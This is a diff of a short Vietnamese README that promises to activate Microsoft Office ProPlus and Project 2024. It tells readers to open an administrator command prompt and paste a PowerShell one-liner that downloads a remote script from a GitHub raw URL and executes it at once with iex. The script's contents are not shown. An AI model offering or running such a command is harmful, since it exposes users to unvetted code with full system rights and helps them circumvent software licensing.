@@ -1,6 +1,7 @@
 # Active Office Prolus mọi phiên bản mới nhất
+
 ## ProJect 2024:
-- Bạn run **cmd** bằng quyền **Run as Administrator** sau đó copy 1 trong 2 đoạn code sau đây dán vào là xong!
+Bạn run **cmd** bằng quyền **Run as Administrator** sau đó copy 1 trong 2 đoạn code sau đây dán vào là xong!
 
   ```php
   powershell iex (irm https://raw.githubusercontent.com/bschithanh/nguon/main/Prolus2024.ps1)
